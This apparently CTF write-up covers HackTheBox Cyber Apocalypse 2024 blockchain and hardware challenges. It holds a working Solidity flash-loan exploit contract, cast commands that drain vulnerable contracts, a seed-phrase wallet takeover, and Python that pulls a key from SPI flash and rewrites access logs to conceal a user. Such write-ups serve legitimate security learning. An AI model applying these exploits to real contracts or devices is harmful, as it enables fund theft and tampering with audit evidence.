[{"categories":null,"content":" HackTheBox - Cyber Apocalypse 2024: Hacker Royale I have been casually participating in the Cyber Apocalypse CTF 2024. During this time, I managed to solve all the challenges in the pwn, crypto, blockchain, and hardware categories. In this write-up, I will share my solutions for all the challenges in the blockchain \u0026 hardware category that I solved. If you are interested in reading the write-up for all the pwn challenges, check out this post. If you are interested in reading the write-up for all the crypto challenges, check out this post. I managed to solve all of the pwn, crypto, blockchain, and hardware challenges by myself :) Blockchain ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:0:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Ledger Heist [hard] Description Amidst the dystopian chaos, the LoanPool stands as a beacon for the oppressed, allowing the brave to deposit tokens in support of the cause. Your mission, should you choose to accept it, is to exploit the system’s vulnerabilities and siphon tokens from this pool, a daring act of digital subterfuge aimed at weakening the regime’s economic stronghold. Success means redistributing wealth back to the people, a crucial step towards undermining the oppressors’ grip on power. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:1:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Initial Analysis In this challenge, we received a zip file containing some smart contracts. As usual, let’s begin by examining the Setup.sol. Setup.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {LoanPool} from \"./LoanPool.sol\"; import {Token} from \"./Token.sol\"; contract Setup { LoanPool public immutable TARGET; Token public immutable TOKEN; constructor(address _user) { TOKEN = new Token(_user); TARGET = new LoanPool(address(TOKEN)); TOKEN.approve(address(TARGET), type(uint256).max); TARGET.deposit(10 ether); } function isSolved() public view returns (bool) { return (TARGET.totalSupply() == 10 ether \u0026\u0026 TOKEN.balanceOf(address(TARGET)) \u003c 10 ether); } } The challenge initially creates a new Token, a new LoanPool, and deposits 10 ether into the LoanPool (TARGET). The objective is to maintain the total supply of the LoanPool at 10 ether, while reducing the TOKEN balance of the LoanPool to less than 10 ether. Let’s first examine the TOKEN. Token.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {Events} from \"./Events.sol\"; // HTB{7H1nk_r0Und1ng_D1reC710N_7W1Ce} contract Token is Events { string public name = \"Token\"; string public symbol = \"Tok\"; uint8 public immutable decimals = 18; uint256 public totalSupply; mapping(address =\u003e uint256) public balanceOf; mapping(address =\u003e mapping(address =\u003e uint256)) public allowance; constructor(address _user) payable { _mint(msg.sender, 10 ether); _mint(_user, 1 ether); } function approve(address spender, uint256 amount) public returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; } function transfer(address to, uint256 amount) public returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; } function transferFrom(address from, address to, uint256 amount) public returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; } function _mint(address to, uint256 amount) private { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); } function _burn(address from, uint256 amount) private { balanceOf[from] -= amount; totalSupply -= amount; emit Transfer(from, address(0), amount); } } It implements a basic token mechanism, where upon construction, the caller is awarded 10 ether and a specified user receives 1 ether. For this challenge, it means Setup.sol receives 10 ether, and the player (us) starts with a 1 ether balance of TOKEN. Now, let’s review the LoanPool contract. LoanPool.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {FixedMathLib} from \"./FixedPointMath.sol\"; import \"./Errors.sol\"; import {IERC20Minimal, IERC3156FlashBorrower} from \"./Interfaces.sol\"; import {Events} from \"./Events.sol\"; struct UserRecord { uint256 feePerShare; uint256 feesAccumulated; uint256 balance; } contract LoanPool is Events { using FixedMathLib for uint256; uint256 constant BONE = 10 ** 18; address public underlying; uint256 public totalSupply; uint256 public feePerShare; mapping(address =\u003e UserRecord) public userRecords; constructor(address _underlying) { underlying = _underlying; } function deposit(uint256 amount) external { updateFees(); IERC20Minimal(underlying).transferFrom(msg.sender, address(this), amount); _mint(msg.sender, amount); } function withdraw(uint256 amount) external { if (userRecords[msg.sender].balance \u003c amount) { revert InsufficientBalance(); } updateFees(); _burn(msg.sender, amount); IERC20Minimal(underlying).transfer(msg.sender, amount); } function updateFees() public { address _msgsender = msg.sender; UserRecord storage record = userRecords[_msgsender]; uint256 fees = record.balance.fixedMulCeil((feePerShare - record.feePerShare), BONE); record.feesAccumulated += fees; record.feePerShare = feePerShare; emit FeesUpdated(underlying, _msgsender, fees); } functi","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:1:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution The critical oversight lies within the flashLoan function. Let’s break down its operation: It checks the initial balance (_balanceBefore). Calculates the loan fee. Transfers amount of TOKEN to the receiver. Executes receiver.onFlashLoan. The receiver must be a contract with an onFlashLoan function returning keccak256(\"ERC3156FlashBorrower.onFlashLoan\"). Checks the balance post-onFlashLoan. Reverts if the new balance is less than _balanceBefore + _fee. The flaw is in validating the return of borrowed funds, as it only verifies the pool’s balance reaches _balanceBefore + _fee. It fails to account for the method of returning the funds. The contract assumes funds are returned via a direct transfer, overlooking the possibility of using the deposit function. For instance, if a user executes flashLoan(10 ether), receives the funds, and instead of transferring them back directly, they deposit the 10 ether and separately transfer the loanFee. This process results in: The user acquiring 10 ether of LPToken. The pool’s balance returning to 10 ether. The pool receiving the loanFee through a manual transfer. This method allows a user to mint 10 ether of LPToken without spending 10 ether of TOKEN, only the loan fee. Subsequently, the user can withdraw 10 ether, causing the pool to burn the LPToken and return an equivalent amount of TOKEN. This action reduces the pool’s TOKEN balance below 10 ether, enabling flag retrieval. Below is the exploit contract designed to exploit the identified vulnerability. The contract aims to initiate a flashLoan and ingeniously returns the loan via a deposit action, also taking care of transferring the necessary fee as dictated by the pool during its invocation of our exploit contract’s onFlashLoan method. Subsequently, the exploit allows for the withdrawal of the erroneously granted LP Token, capitalizing on the bug. Comments within the code offer further clarification on its workings. // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {FixedMathLib} from \"./FixedPointMath.sol\"; import \"./Errors.sol\"; import {IERC20Minimal, IERC3156FlashBorrower} from \"./Interfaces.sol\"; import {Events} from \"./Events.sol\"; import {LoanPool} from \"./LoanPool.sol\"; import {Token} from \"./Token.sol\"; import {Setup} from \"./Setup.sol\"; contract Exploit { LoanPool public immutable TARGET; Token public immutable TOKEN; constructor(address _setup) { Setup setup = Setup(_setup); TARGET = setup.TARGET(); TOKEN = setup.TOKEN(); } function attack() public { require(TOKEN.balanceOf(address(this)) == 1 ether, \"AAA\"); // Trigger flashLoan, later give back the loaned money via deposit TARGET.flashLoan(IERC3156FlashBorrower(address(this)), address(TOKEN), 10 ether, bytes(\"\")); // Now, we can easily withdraw and get free money :) TARGET.withdraw(10 ether); } function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) { // At this stage, we already have the loaned money // Deposit it back to the pool TOKEN.approve(address(TARGET), type(uint256).max); TARGET.deposit(amount); // Transfer the fee TOKEN.transfer(address(TARGET), fee); return keccak256(\"ERC3156FlashBorrower.onFlashLoan\"); } } To deploy and execute this exploit using Foundry: Initialize a new Foundry project with forge init. Copy all challenge contracts into the src/ directory. Create Exploit.sol inside src/, incorporating the exploit code. Use forge to deploy the exploit contract. Execute forge create ./src/Exploit.sol:Exploit --rpc-url \u003crpc_url\u003e --private-key \u003cprivate_key\u003e --constructor-args \u003csetup_address\u003e to deploy. Transfer 1 ether of your TOKEN to the deployed contract. Obtain the TOKEN address with cast call \u003csetup_address\u003e \"TOKEN()\" -r \u003crpc_url\u003e. Transfer 1 ether to the exploit contract using cast send \u003ctoken_address\u003e \"transfer(address,uint256)\" -r \u003crpc_url\u003e --private-key \u003cprivate_key\u003e -- \u003cexploit_address\u003e 1000000000000000000. Trigger the attack function on the deployed cont","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:1:2","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Recovery [easy] Description We are The Profits. During a hacking battle our infrastructure was compromised as were the private keys to our Bitcoin wallet that we kept. We managed to track the hacker and were able to get some SSH credentials into one of his personal cloud instances, can you try to recover my Bitcoins? Username: satoshi Password: L4mb0Pr0j3ct NOTE: Network is regtest, check connection info in the handler first. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:2:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Initial Analysis We didn’t receive any files directly, but upon launching a Docker instance, we were provided with three pairs of IP addresses and ports. Connecting via netcat to the third pair revealed instructions for our task: we need to access a hacker’s wallet and transfer all the money to a designated address. nc 94.237.56.255 48197 Hello fella, help us recover our bitcoins before it's too late. Return our Bitcoins to the following address: bcrt1ql97nl7ph725kpqd4yuztnasa5chnf70y3775wk CONNECTION INFO: - Network: regtest - Electrum server to connect to blockchain: 0.0.0.0:50002:t NOTE: These options might be useful while connecting to the wallet, e.g --regtest --oneserver -s 0.0.0.0:50002:t Hacker wallet must have 0 balance to earn your flag. We want back them all. Next, we proceeded by connecting to the first IP and port pair using ssh, with the hacker’s SSH credentials as indicated. This connection allowes us to read the wallet seed, crucial for taking control of the hacker’s wallet. satoshi@ng-team-51812-blockchainrecoveryca2024-uqfrf-75d8d97989-mrzzp ➜ ~ ls wallet satoshi@ng-team-51812-blockchainrecoveryca2024-uqfrf-75d8d97989-mrzzp ➜ ~ ls wallet electrum-wallet-seed.txt satoshi@ng-team-51812-blockchainrecoveryca2024-uqfrf-75d8d97989-mrzzp ➜ ~ cat wallet/electrum-wallet-seed.txt harsh hungry raccoon leg segment habit afford spice kangaroo version woman tuna ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:2:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution With the wallet seed in hand, our next step was to install electrum. The installation process is straightforward: Download the Electrum package using wget https://download.electrum.org/4.5.3/Electrum-4.5.3.tar.gz Install Electrum with pip install --user Electrum-4.5.3.tar.gz Start Electrum, ensuring it connects to the second IP and port pair we received: electrum --regtest --oneserver -s 94.237.56.255:57370:t After initiating Electrum, we imported the wallet using the seed we had found earlier. This granted us access to the hacker’s wallet, from which we could then transfer all the money to the specified address. Finally, to complete our task, we reconnected to the first IP and port pair using netcat to retrieve the flag. Flag: HTB{n0t_y0ur_k3ys_n0t_y0ur_c01n5} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:2:2","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Lucky Faucet [easy] Description The Fray announced the placement of a faucet along the path for adventurers who can overcome the initial challenges. It’s designed to provide enough resources for all players, with the hope that someone won’t monopolize it, leaving none for others. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:3:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Initial Analysis We were provided with two smart contracts: Setup.sol and LuckyFaucet.sol. Let’s begin with an overview of Setup.sol Setup.sol // SPDX-License-Identifier: UNLICENSED pragma solidity 0.7.6; import {LuckyFaucet} from \"./LuckyFaucet.sol\"; contract Setup { LuckyFaucet public immutable TARGET; uint256 constant INITIAL_BALANCE = 500 ether; constructor() payable { TARGET = new LuckyFaucet{value: INITIAL_BALANCE}(); } function isSolved() public view returns (bool) { return address(TARGET).balance \u003c= INITIAL_BALANCE - 10 ether; } } The challenge begins by depositing 500 ether into the LuckyFaucet contract upon its deployment. Our objective is to reduce the balance of LuckyFaucet to 490 ether or less. Now, let’s delve into the LuckyFaucet contract. LuckyFaucet.sol // SPDX-License-Identifier: MIT pragma solidity 0.7.6; contract LuckyFaucet { int64 public upperBound; int64 public lowerBound; constructor() payable { // start with 50M-100M wei Range until player changes it upperBound = 100_000_000; lowerBound = 50_000_000; } function setBounds(int64 _newLowerBound, int64 _newUpperBound) public { require(_newUpperBound \u003c= 100_000_000, \"100M wei is the max upperBound sry\"); require(_newLowerBound \u003c= 50_000_000, \"50M wei is the max lowerBound sry\"); require(_newLowerBound \u003c= _newUpperBound); // why? because if you don't need this much, pls lower the upper bound :) // we don't have infinite money glitch. upperBound = _newUpperBound; lowerBound = _newLowerBound; } function sendRandomETH() public returns (bool, uint64) { int256 randomInt = int256(blockhash(block.number - 1)); // \"but it's not actually random 🤓\" // we can safely cast to uint64 since we'll never // have to worry about sending more than 2**64 - 1 wei uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); bool sent = msg.sender.send(amountToSend); return (sent, amountToSend); } } Upon examining the contract, we find two functions of interest: setBounds and sendRandomETH. The sendRandomETH function attempts to transfer an amountToSend in ether to the caller, with the amount being determined within the bounds of lowerBound + (upperBound - lowerBound + 1). It’s important to note that 1 ether equals 10**18, making the initial bounds (5*10**7 to 10**8) significantly smaller by comparison. Thus, extracting 10 ether (or 10**19) using the initial bounds would be impractically slow. Based on this, we need to think a solution on how to make this faster. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:3:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution However, we observe that both upperBound and lowerBound are signed integers (int64), allowing us to set a large negative value for lowerBound through setBounds. By assigning a substantially negative value to lowerBound, we can achieve a large amountToSend. Even if the result of randomInt % (upperBound - lowerBound + 1) + lowerBound is negative, it will be cast to uint64, resulting in a substantial amountToSend. To overcome this challenge, we can simply set the bounds to a significantly negative number and then invoke sendRandomETH. This approach will enable us to drain more than 10 ETH. Here’s the solution utilizing foundry cast: cast send \u003ctarget_address\u003e \"setBounds(int64,int64)\" -r \u003crpc_url\u003e --private-key \u003cprivate_key\u003e -- -1000000000000000000 100000000 cast send \u003ctarget_address\u003e \"sendRandomETH()\" -r \u003crpc_url\u003e --private-key \u003cprivate_key\u003e Flag: HTB{1_f0rg0r_s0m3_U} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:3:2","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Russian Roulette [very easy] Description Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm. Are you brave enough? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:4:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Initial Analysis We were given two smart contracts: Setup.sol and RussianRoulette.sol. Let’s start by examining the Setup.sol. Setup.sol pragma solidity 0.8.23; import {RussianRoulette} from \"./RussianRoulette.sol\"; contract Setup { RussianRoulette public immutable TARGET; constructor() payable { TARGET = new RussianRoulette{value: 10 ether}(); } function isSolved() public view returns (bool) { return address(TARGET).balance == 0; } } Upon inspecting the code, we find that the initial setup involves depositing 10 ether into the RussianRoulette contract. Our objective is to reduce the balance of the RussianRoulette contract (referred to as TARGET) to 0. Now, let’s turn our attention to RussianRoulette.sol. RussianRoulette.sol pragma solidity 0.8.23; contract RussianRoulette { constructor() payable { // i need more bullets } function pullTrigger() public returns (string memory) { if (uint256(blockhash(block.number - 1)) % 10 == 7) { selfdestruct(payable(msg.sender)); // 💀 } else { return \"im SAFU ... for now\"; } } } This contract features a single function named pullTrigger(). If (uint256(blockhash(block.number - 1)) % 10 == 7) evaluates to true, the contract executes selfdestruct. This action transfers the contract’s remaining balance to a specified address, in this case, the caller of pullTrigger. Each new transaction invoking pullTrigger can produce new block.number, implying that eventually, the condition within the if statement will be met, triggering the action. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:4:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution Based on this analysis, we can repeatedly call pullTrigger() until the selfdestruct is activated. Here’s an example command for invoking pullTrigger() using foundry cast: cast send \u003ctarget_address\u003e \"pullTrigger()\" -r \u003crpc_url\u003e --private-key \u003cprivate_key\u003e Flag: HTB{99%_0f_g4mbl3rs_quit_b4_bigwin} Hardware ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:4:2","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Flash-ing Logs [hard] Description After deactivating the lasers, you approach the door to the server room. It seems there’s a secondary flash memory inside, storing the log data of every entry. As the system is air-gapped, you must modify the logs directly on the chip to avoid detection. Be careful to alter only the user_id = 0x5244 so the registered logs point out to a different user. The rest of the logs stored in the memory must remain as is. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:5:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with client.py to interact with flash memory, alongside a C file named log_event.c. log_event.c #include \u003cstdio.h\u003e #include \u003cstdint.h\u003e #include \u003cstdbool.h\u003e #include \u003cstring.h\u003e #include \u003cwiringPiSPI.h\u003e #include \"W25Q128.h\" // Our custom chip is compatible with the original W25Q128XX design #define SPI_CHANNEL 0 // /dev/spidev0.0 //#define SPI_CHANNEL 1 // /dev/spidev0.1 #define CRC_SIZE 4 // Size of the CRC data in bytes #define KEY_SIZE 12 // Size of the key // SmartLockEvent structure definition typedef struct { uint32_t timestamp; // Timestamp of the event uint8_t eventType; // Numeric code for type of event // 0 to 255 (0xFF) uint16_t userId; // Numeric user identifier // 0 t0 65535 (0xFFFF) uint8_t method; // Numeric code for unlock method uint8_t status; // Numeric code for status (success, failure) } SmartLockEvent; // Function Prototypes int log_event(const SmartLockEvent event, uint32_t sector, uint32_t address); uint32_t calculateCRC32(const uint8_t *data, size_t length); void write_to_flash(uint32_t sector, uint32_t address, uint8_t *data, size_t length); // CRC-32 calculation function uint32_t calculateCRC32(const uint8_t *data, size_t length) { uint32_t crc = 0xFFFFFFFF; for (size_t i = 0; i \u003c length; ++i) { crc ^= data[i]; for (uint8_t j = 0; j \u003c 8; ++j) { if (crc \u0026 1) crc = (crc \u003e\u003e 1) ^ 0xEDB88320; else crc \u003e\u003e= 1; } } return ~crc; } bool verify_flashMemory() { uint8_t jedc[3]; uint8_t uid[8]; uint8_t buf[256]; uint8_t wdata[26]; uint8_t i; uint16_t n; bool jedecid_match = true; // Assume true, prove false bool uid_match = true; // Assume true, prove false // JEDEC ID to verify against uint8_t expectedJedec[3] = {0xEF, 0x40, 0x18}; // UID to verify against uint8_t expectedUID[8] = {0xd2, 0x66, 0xb4, 0x21, 0x83, 0x1f, 0x09, 0x2b}; // SPI channel 0 at 2MHz. // Start SPI channel 0 with 2MHz if (wiringPiSPISetup(SPI_CHANNEL, 2000000) \u003c 0) { printf(\"SPISetup failed:\\n\"); } // Start Flash Memory W25Q128_begin(SPI_CHANNEL); // JEDEC ID Get //W25Q128_readManufacturer(buf); W25Q128_readManufacturer(jedc); printf(\"JEDEC ID : \"); for (i=0; i\u003c 3; i++) { printf(\"%x \",jedc[i]); } // Iterate over the array and compare elements for (int i = 0; i \u003c sizeof(jedc)/sizeof(jedc[0]); ++i) { if (jedc[i] != expectedJedec[i]) { jedecid_match = false; // Set match to false if any element doesn't match break; // No need to check further if a mismatch is found } } if (jedecid_match) { printf(\"JEDEC ID verified successfully.\\n\"); } else { printf(\"JEDEC ID does not match.\\n\"); return 0; } // Unique ID // Unique ID Get W25Q128_readUniqieID(uid); printf(\"Unique ID : \"); for (i=0; i\u003c 8; i++) { printf(\"%x \",uid[i]); } printf(\"\\n\"); // Iterate over the array and compare elements for (int i = 0; i \u003c sizeof(uid)/sizeof(uid[0]); ++i) { if (uid[i] != expectedUID[i]) { uid_match = false; // Set match to false if any element doesn't match break; // No need to check further if a mismatch is found } } if (uid_match) { printf(\"UID verified successfully.\\n\"); } else { printf(\"UID does not match.\\n\"); return 0; } return 1; } // Implementations int log_event(const SmartLockEvent event, uint32_t sector, uint32_t address) { bool memory_verified = false; uint8_t i; uint16_t n; uint8_t buf[256]; memory_verified = verify_flashMemory(); if (!memory_verified) return 0; // Start Flash Memory W25Q128_begin(SPI_CHANNEL); // Erase data by Sector if (address == 0){ printf(\"ERASE SECTOR!\"); n = W25Q128_eraseSector(0, true); printf(\"Erase Sector(0): n=%d\\n\",n); memset(buf,0,256); n = W25Q128_read (0, buf, 256); } uint8_t buffer[sizeof(SmartLockEvent) + sizeof(uint32_t)]; // Buffer for event and CRC uint32_t crc; memset(buffer, 0, sizeof(SmartLockEvent) + sizeof(uint32_t)); // Serialize the event memcpy(buffer, \u0026event, sizeof(SmartLockEvent)); // Calculate CRC for the serialized event crc = calculateCRC32(buffer, sizeof(SmartLockEvent)); // Append CRC to the buffer memcpy(buffer + sizeof(SmartLockEvent), \u0026crc, sizeof(crc));","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:5:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution I revisited the flash memory documentation, using the same resource as before. To simplify the process, I extended client.py with an EventLog class for easier log parsing. # SOLVER from pwn import p32, u32, p16, u16, p8, u8 from zlib import crc32 from datetime import datetime class EventLog: timestamp = 0 event_type = 0 user_id = 0 method = 0 status = 0 def __init__(self, timestamp, event_type, user_id, method, status): self.timestamp = timestamp self.event_type = event_type self.user_id = user_id self.method = method self.status = status def out(self): print(f''' timestamp : {self.timestamp} ({datetime.fromtimestamp(self.timestamp)}) event_type: {self.event_type} user_id : {hex(self.user_id)} method : {self.method} status : {self.status} ''') def serialize(self): return p32(self.timestamp) + p16(self.event_type) + p16(self.user_id) + p8(self.method) + p8(self.status) + p16(0) Reading through the documentaion, I identified a useful command, Read Security Registers (Section 8.2.33, instruction code 0x48), which can be used to obtain the encryption key. Here’s a snippet for fetching the key: CMD_READ_SEC_REG = 0x48 # Do read_security_register(1, 0x52, KEY_SIZE) key = exchange([CMD_READ_SEC_REG, 0x00, 0x01 \u003c\u003c 4, 0x52], 12) print(f'key = {bytes(key)}') Armed with the key, decrypting the event logs was straightforward. The script below was used to parse the event logs stored in the flash memory: CMD_READ = 0x3 KEY_SIZE = 12 # Helper # read_data format: addr is array of 3 bytes, size is int def read_data(addr, size): return bytes(exchange([CMD_READ]+addr, size)) # Define decrypt and encrypt functions def decrypt(data): dec_data = [] for i in range(len(data)): dec_data.append(data[i]^key[i%KEY_SIZE]) return bytes(dec_data) def encrypt(data): enc_data = [] for i in range(len(data)): enc_data.append(data[i]^key[i%KEY_SIZE]) return bytes(enc_data) # Convert raw_event_log to EventLog class def parse_log(event_log): timestamp = u32(event_log[:4]) event_type = u16(event_log[4:6]) user_id = u16(event_log[6:8]) method = u8(event_log[8:9]) status = u8(event_log[9:10]) return EventLog(timestamp, event_type, user_id, method, status) # Read event_log from spiflash def read_event_log(address): addr = [b for b in p32(address)[::-1][1:]] # 24 byte # CMD_READ(addr, len) # sizeof(SmartLockEvent) is 0xc (not 0x9 because of compiler struct padding) # sizeof(crc32) is 0x4 out = read_data(addr, 0xc+0x4) enc_log = out[:0xc] crc32_log = u32(out[0xc:]) if enc_log == b'\\xff'*0xc: # Invalid log (data in the specified address is clean) return 0, 0, False # Decrypt encrypted event_log with the key that we retrieved raw_log = decrypt(enc_log) assert crc32(raw_log) == crc32_log # Parse log to help our life easier event_log = parse_log(raw_log) return event_log, crc32_log, True event_logs = {} # There are 160 logs based on testing manually # (also the event log for user_id 0x5244 start from idx 156) print(f'Search for user_id 0x5244 event_logs') for i in range(0, 160): print('----') print(f'log-{i}...') event_log, crc32_log, is_valid = read_event_log(i*0x10) if not is_valid: break event_log.out() if event_log.user_id == 0x5244: event_logs[i] = event_log print('---') The script iterates through encrypted logs, moving 0x10 bytes at a time (since each log, including CRC32, is 0x10 bytes long), decrypting them with the key. Logs from event_logs[156] to event_logs[159] were identified as the user 0x5244’s entries logs and needed to be changed. Changing these logs was relatively simple with the encryption key. The script below was used for constructing the altered data: # Notes that later, we need to erase the whole sector of spiflash (4096 bytes) # before we can overwrite the event_log of user id 0x5244. # So, let's recover the data first. # Read raw data 160 * 0x10 starting from address 0 raw_data = bytes(exchange([CMD_READ, 0x00, 0x00, 0x00], 160*0x10)) # From preious output, we know that data 156-159 contains user_id 0x5244. # Let's alter it print(f'Start c","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:5:2","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"The PROM [medium] Description After entering the door, you navigate through the building, evading guards, and quickly locate the server room in the basement. Despite easy bypassing of security measures and cameras, laser motion sensors pose a challenge. They’re controlled by a small 8-bit computer equipped with AT28C16 a well-known EEPROM as its control unit. Can you uncover the EEPROM’s secrets? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:6:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Initial Analysis In this challenge, while no files were provided, we can spawn an instance for interacting with the specified hardware, the AT28C16 EEPROM. Our first step was to establish a connection to this instance. nc 83.136.250.41 52004 AT28C16 EEPROMs _____ _____ | \\_/ | A7 [| 1 24 |] VCC A6 [| 2 23 |] A8 A5 [| 3 22 |] A9 A4 [| 4 21 |] !WE A3 [| 5 20 |] !OE A2 [| 6 19 |] A10 A1 [| 7 18 |] !CE A0 [| 8 17 |] I/O7 I/O0 [| 9 16 |] I/O6 I/O1 [| 10 15 |] I/O5 I/O2 [| 11 14 |] I/O4 GND [| 12 13 |] I/O3 |_____________| \u003e help Usage: method_name(argument) EEPROM COMMANDS: set_address_pins(address) Sets the address pins from A10 to A0 to the specified values. set_ce_pin(volts) Sets the CE (Chip Enable) pin voltage to the specified value. set_oe_pin(volts) Sets the OE (Output Enable) pin voltage to the specified value. set_we_pin(volts) Sets the WE (Write Enable) pin voltage to the specified value. set_io_pins(data) Sets the I/O (Input/Output) pins to the specified data values. read_byte() Reads a byte from the memory at the current address. write_byte() Writes the current data to the memory at the current address. help Displays this help menu. Examples: set_ce_pin(3.5) set_io_pins([0, 5.1, 3, 0, 0, 3.1, 2, 4.2]) \u003e The connection provided us with a list of available commands, indicating that the EEPROM emulator is storing the flag we’re after. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:6:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution As usual, I began by searching the EEPROM’s documentation. I found a good resource that detailed the correct interaction methods with the EEPROM. According to the document: READ: The AT28C16 is accessed like a Static RAM. When CE and OE are low and WE 